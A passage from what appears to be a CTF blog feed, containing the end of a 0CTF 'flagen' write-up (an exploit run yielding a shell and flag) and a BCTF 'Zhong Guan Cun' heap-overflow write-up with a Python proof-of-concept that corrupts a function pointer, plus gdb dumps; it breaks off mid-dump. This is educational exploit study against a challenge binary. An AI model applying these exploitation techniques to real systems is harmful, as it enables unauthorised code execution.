</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">0</span><span class="n">ctf</span><span class="o">/</span><span class="n">flagen</span><span class="err">$</span> <span class="n">python</span> <span class="o">./</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">enjoy</span> <span class="n">your</span> <span class="n">shell</span><span class="err">!</span>
</span><span class='line'><span class="nb">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flagen</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flagen</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flagen</span><span class="p">)</span>
</span><span class='line'><span class="n">whoami</span>
</span><span class='line'><span class="n">flagen</span>
</span><span class='line'><span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flagen</span><span class="o">/</span><span class="n">flag</span>
</span><span class='line'><span class="mi">0</span><span class="n">ctf</span><span class="p">{</span><span class="n">delicious_stack_cookie_generates_flag</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[After the Fact - BCTF Zhong Guan Cun Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/"/>
    <updated>2015-03-23T18:55:51+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup</id>
    <content type="html"><![CDATA[<p>We&rsquo;re entering a CTF almost every weekend now, but they&rsquo;ve been really tough. I did not manage to exploit this challenge in time, but one day after the CTF ended I had an epiphany and got my exploit working. I figured I&rsquo;d share how I approached this challenge for future reference.</p>

<!-- more -->


<p>For this pwnable, called <code>Zhong guan cun</code>, we&rsquo;re given a 32-bit ELF binary and libraries. The task is to exploit it remotely and grab a flag. As said, I did not manage to grab the flag, but I got the exploit working locally.</p>

<p>The binary represents some kind of online store testing program, where we&rsquo;re able to set a name and add items to the shop. Then, we can try out said shop, buying the items and asking for wholesale prices. We <em>cannot</em> modify any entry, nor delete anything after we&rsquo;ve set it.</p>

<p>Playing around with the binary a bit, I noticed that it immediately quit when attempting to overflow a buffer.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>*********************************
</span><span class='line'>*** Welcome to Zhong Guan Cun ***
</span><span class='line'>*********************************
</span><span class='line'>Are you dreaming of becoming a Milli<span class="nv">$_$naire</span>?
</span><span class='line'>Come to sell some electronics!
</span><span class='line'>
</span><span class='line'>a<span class="o">)</span> Register my store
</span><span class='line'>b<span class="o">)</span> Try my store
</span><span class='line'>c<span class="o">)</span> Exit
</span><span class='line'>Your choice? a
</span><span class='line'>What<span class="s1">&#39;s the name of your store? BLEH</span>
</span><span class='line'><span class="s1">a) Sell a phone</span>
</span><span class='line'><span class="s1">b) Sell a watch</span>
</span><span class='line'><span class="s1">c) Generate a store menu</span>
</span><span class='line'><span class="s1">d) Return to main menu</span>
</span><span class='line'><span class="s1">Your choice? a</span>
</span><span class='line'><span class="s1">Phone&#39;</span>s name? PHONE1
</span><span class='line'>1<span class="o">)</span> Android OS
</span><span class='line'>2<span class="o">)</span> iOS
</span><span class='line'>3<span class="o">)</span> Windows OS
</span><span class='line'>4<span class="o">)</span> Blackberry OS
</span><span class='line'>5<span class="o">)</span> Symbian OS
</span><span class='line'>Choose Phone<span class="s1">&#39;s OS? 1</span>
</span><span class='line'><span class="s1">Phone&#39;</span>s price? 99999999999
</span><span class='line'>Phone<span class="err">&#39;</span>s description? PHONE1
</span><span class='line'>New phone added successfully!
</span><span class='line'>a<span class="o">)</span> Sell a phone
</span><span class='line'>b<span class="o">)</span> Sell a watch
</span><span class='line'>c<span class="o">)</span> Generate a store menu
</span><span class='line'>d<span class="o">)</span> Return to main menu
</span><span class='line'>Your choice? c
</span><span class='line'><span class="o">&lt;&lt;&lt;</span> Store Name: BLEH &gt;&gt;&gt;
</span><span class='line'><span class="o">===</span> Items in the <span class="nv">store</span> <span class="o">===</span>
</span><span class='line'>1<span class="o">)</span> Android OS Phone PHONE1 price: <span class="m">2147483647</span> CNY description: PHONE1
</span><span class='line'>Congraz! Your store menu is generated successfully!
</span><span class='line'>a<span class="o">)</span> Sell a phone
</span><span class='line'>b<span class="o">)</span> Sell a watch
</span><span class='line'>c<span class="o">)</span> Generate a store menu
</span><span class='line'>d<span class="o">)</span> Return to main menu
</span><span class='line'>Your choice? AAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>Input is Too Long.
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I reversed the item struct. The items are stored on the heap and we can&rsquo;t have more than 16 items in total.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>            .-- ptr to two <span class="k">function</span> addresses
</span><span class='line'>            <span class="p">|</span>             .-- start of phone/watch name, 0x20 bytes long
</span><span class='line'>            v             v
</span><span class='line'>0x8257008:  0x08049b70    0x41414141  0x41414141  0x41414141
</span><span class='line'>0x8257018:  0x41414141    0x41414141  0x41414141  0x41414141
</span><span class='line'>                          .-- start of phone/watch description, 0x50 bytes long
</span><span class='line'>                          v
</span><span class='line'>0x8257028:    0x00414141  0x42424242  0x42424242  0x42424242
</span><span class='line'>0x8257038:    0x42424242  0x42424242  0x42424242  0x42424242
</span><span class='line'>0x8257048:    0x42424242  0x42424242  0x42424242  0x42424242
</span><span class='line'>0x8257058:    0x42424242  0x42424242  0x42424242  0x42424242
</span><span class='line'>0x8257068:    0x42424242  0x42424242  0x42424242  0x42424242
</span><span class='line'>0x8257078:    0x00424242  0x000003e8
</span><span class='line'>                          ^
</span><span class='line'>                          <span class="sb">`</span>-- price
</span></code></pre></td></tr></table></div></figure>


<p>After finding the function that reads in the input, I tried to find an overflow or off-by-one vulnerability, but everything was locked down tight. There was, however, another thing that caught my attention.</p>

<h2>Heaps of fun</h2>

<p>We have to corrupt some piece of memory somewhere, but the items themselves are not going to cut it. We do, however, have control over the store menu string. This turned out to be the key. If I first added an item, then generated the store menu string and finally added a second item, the layout of the items and store menu on the heap was like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/20wx 0x804b300
</span><span class='line'>              .-- ptr to store menu string
</span><span class='line'>              v
</span><span class='line'>0x804b300:    0x0804c088  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804b310:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804b320:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804b330:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804b340:    0x0804c008  0x0804cbb8  0x00000000  0x00000000
</span><span class='line'>              ^           ^
</span><span class='line'>              <span class="sb">`</span>-- item1   <span class="p">|</span>
</span><span class='line'>                          <span class="sb">`</span>-- item2
</span><span class='line'>    e.g. item1 <span class="p">|</span> store_menu <span class="p">|</span> item2
</span></code></pre></td></tr></table></div></figure>


<p>The store description string was in between the items on the stack. The items contained a pointer to two function address:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>            .-- ptr to two <span class="k">function</span> addresses
</span><span class='line'>            <span class="p">|</span>             .-- start of phone/watch name, 0x20 bytes long
</span><span class='line'>            v             v
</span><span class='line'>0x8257008:  0x08049b70    0x41414141  0x41414141  0x41414141
</span><span class='line'>               ^
</span><span class='line'>               <span class="p">|</span>
</span><span class='line'>               <span class="sb">`</span>--- this value points to two functions:
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/2wx 0x08049b70
</span><span class='line'>0x8049b70:    0x08049466  0x080492fe
</span></code></pre></td></tr></table></div></figure>


<p>If I could somehow overwrite that pointer of an item by overflowing the store description string, I could possible get code execution (it was nowhere near that easy, but bear with me). I started trying to generate large items, and indeed, I could overflow the function pointer of the second item using large inputs. The trick was to also set the price to a negative value, giving me just enough bytes to overflow. I whipped up a poc python script to do this for me. The layout and some functions of this poc are heavily inspired by <a href="https://gist.github.com/saelo/9e6934b3c40cf42e3f87">saelo</a>!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># pause to allow gdb to attach</span>
</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># register store</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;store?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;S&quot;</span><span class="o">*</span><span class="mi">63</span><span class="p">)</span> <span class="c"># store name; maximum allowed, need it to overflow a buffer later!</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># the program *needs* to have an item to sell before it can generate a store menu</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># generate store menu. this will be 0xb20 bytes large, on the heap. </span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># second item, will be allocated after the store menu string</span>
</span><span class='line'>  <span class="c"># this is the one whose function pointer we will corrupt</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xf</span><span class="p">)</span>  <span class="c"># this will make the price of this item 0x7fffffff, ready to be abused later</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># allocate the rest of the items</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>    <span class="c"># for these, we&#39;ll need the minus sign.</span>
</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span> 
</span><span class='line'>  
</span><span class='line'>  <span class="c"># overflow</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;CCCC&#39;</span><span class="p">)</span>       <span class="c"># overflow with 0x43434343</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span> <span class="c"># generate store menu &amp; overflow; 2nd item now points to 0x43434343</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And in action:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">x</span> <span class="mh">0x804b300</span>
</span><span class='line'><span class="mh">0x804b300</span><span class="p">:</span> <span class="mh">0x08a50088</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804b310</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804b320</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804b330</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804b340</span><span class="p">:</span> <span class="mh">0x08a50008</span>  <span class="mh">0x08a50ba8</span>  <span class="mh">0x08a50c28</span>  <span class="mh">0x08a50ca8</span>
</span><span class='line'><span class="mh">0x804b350</span><span class="p">:</span> <span class="mh">0x08a50d28</span>  <span class="mh">0x08a50da8</span>  <span class="mh">0x08a50e28</span>  <span class="mh">0x08a50ea8</span>
</span><span class='line'><span class="mh">0x804b360</span><span class="p">:</span> <span class="mh">0x08a50f28</span>  <span class="mh">0x08a50fa8</span>  <span class="mh">0x08a51028</span>  <span class="mh">0x08a510a8</span>
</span><span class='line'><span class="mh">0x804b370</span><span class="p">:</span> <span class="mh">0x08a51128</span>  <span class="mh">0x08a511a8</span>  <span class="mh">0x08a51228</span>  <span class="mh">0x08a512a8</span>
</span><span class='line'><span class="mh">0x804b380</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804b390</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="c"># let&#39;s have a look at the second item:</span>
</span><span class='line'>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">wx</span> <span class="mh">0x08a50ba8</span>
</span><span class='line'>            <span class="o">.--</span> <span class="n">now</span> <span class="n">overwritten</span><span class="err">!</span>
</span><span class='line'>            <span class="n">v</span>
</span><span class='line'><span class="mh">0x8a50ba8</span><span class="p">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x41414100</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8a50bb8</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8a50bc8</span><span class="p">:</span> <span class="mh">0x00414141</span>  <span class="mh">0x04b03741</span>  <span class="mh">0x41414108</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8a50bd8</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8a50be8</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8a50bf8</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8a50c08</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
